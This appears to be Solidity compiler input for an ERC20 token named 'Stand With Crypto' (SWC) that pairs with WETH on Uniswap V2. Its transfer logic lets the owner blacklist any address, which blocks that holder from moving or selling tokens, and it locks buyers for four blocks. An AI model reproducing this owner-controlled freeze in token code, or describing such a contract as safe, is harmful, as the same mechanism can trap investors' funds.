{{
  "language": "Solidity",
  "sources": {
    "contracts/utils/ERC20.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract ERC20 {\n\n    uint internal _totalSupply;\n    mapping(address => uint) internal _balanceOf;\n    mapping(address => mapping(address => uint)) internal _allowance;\n\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function _mint(address to, uint value) internal {\n        _totalSupply += value;\n        _balanceOf[to] += value;\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint value) internal {\n        _balanceOf[from] -= value;\n        _totalSupply -= value;\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint value\n    ) internal virtual {\n        _allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint value\n    ) internal virtual {\n        _balanceOf[from] -= value;\n        _balanceOf[to] += value;\n        emit Transfer(from, to, value);\n    }\n\n    function allowance(address owner, address spender) external view virtual returns (uint) {\n        return _allowance[owner][spender];\n    }\n\n    function _spendAllowance(address owner, address spender, uint value) internal virtual {\n        if (_allowance[owner][spender] != type(uint256).max) {\n            require(_allowance[owner][spender] >= value, \"ERC20: insufficient allowance\");\n            _allowance[owner][spender] -= value;\n        }\n    }\n\n    function totalSupply() external view virtual returns (uint) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address owner) external view virtual returns (uint) {\n        return _balanceOf[owner];\n    }\n\n    function approve(address spender, uint value) external virtual returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint value) external virtual returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n    \n    function transferFrom(\n        address from,\n        address to,\n        uint value\n    ) external virtual returns (bool) {\n        _spendAllowance(from, msg.sender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n}\n"
    },
    "contracts/work/SWC.sol": {
      "content": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {ERC20} from \"../utils/ERC20.sol\";\n\ninterface IUNI {\n    function createPair(address, address) external returns (address);\n}\n\ncontract SWC is ERC20 {\n\n    /// @notice Uniswap V2 (UNI-V2) SWC - WETH pair address\n    address public immutable swcPair;\n    /// @notice After purchase, selling is not allowed in the current block to prevent arbitrage bot attacks.\n    mapping(address => uint256) public freezedBlock;\n\n    address public owner;\n\n    mapping(address => bool) public blackList;\n    event BlackList(address indexed account, bool value);\n\n    modifier onlyOwner {\n        require(msg.sender == owner, \"only owner\");\n        _;\n    }\n\n    function name() public pure returns (string memory) {\n        return \"Stand With Crypto\";\n    }\n\n    function symbol() public pure returns (string memory) {\n        return \"SWC\";\n    }\n\n    function decimals() public pure returns (uint8) {\n        return 18;\n    }\n\n    function setBlackList(address[] calldata _accounts, bool[] calldata _values) external onlyOwner {\n        for(uint i = 0; i < _accounts.length; i++) {\n            blackList[_accounts[i]] = _values[i];\n            emit BlackList(_accounts[i], _values[i]);\n        }\n    }\n\n    function setOwner(address _owner) external onlyOwner {\n        owner = _owner;\n    }\n\n    constructor(\n        address _factory,\n        address _weth\n    ) {\n        _mint(msg.sender, 120_000_000_000_000 ether);\n        swcPair = IUNI(_factory).createPair(address(this), _weth);\n        owner = msg.sender;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint value\n    ) internal override {\n        require(!blackList[from], \"locked\");\n        require(block.number >= freezedBlock[from], \"not allowed current block\");\n        // @dev buy and remove liquidity\n        if (from == swcPair) {\n            // @dev After purchase, the account will be temporarily locked for 4 blocks.\n            freezedBlock[to] = block.number + 4;\n        }\n        _balanceOf[from] -= value;\n        _balanceOf[to] += value;\n        emit Transfer(from, to, value);\n    }\n\n    function burn(uint256 amount) external {\n        _burn(msg.sender, amount);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}